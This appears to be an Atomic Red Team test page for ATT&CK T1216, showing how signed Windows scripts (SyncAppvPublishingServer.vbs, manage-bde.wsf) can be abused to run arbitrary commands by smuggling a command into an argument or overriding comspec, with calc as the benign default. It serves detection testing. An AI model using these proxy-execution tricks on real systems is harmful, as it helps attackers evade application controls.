---
tags: [T1216, atomic_test]
filename: "[[T1216 - Signed Script Proxy Execution]]"
---
# T1216 - Signed Script Proxy Execution

## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution
Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
Upon execution, calc.exe will be launched.

**Supported Platforms:** Windows


**auto_generated_guid:** 275d963d-3f36-476c-8bef-a2a3960ee6eb





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| command_to_execute | A PowerShell command to execute. | string | Start-Process calc|


#### Attack Commands: Run with `command_prompt`! 


```cmd
C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
```






<br/>
<br/>

## Atomic Test #2 - manage-bde.wsf Signed Script Command Execution
Executes the signed manage-bde.wsf script with options to execute an arbitrary command.

**Supported Platforms:** Windows


**auto_generated_guid:** 2a8f2d3c-3dec-4262-99dd-150cb2a4d63a





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| command_to_execute | A command to execute. | path | %windir%&#92;System32&#92;calc.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
set comspec=#{command_to_execute}
cscript %windir%\System32\manage-bde.wsf
```

#### Cleanup Commands:
```cmd
set comspec=%windir%\System32\cmd.exe
```





<br/>
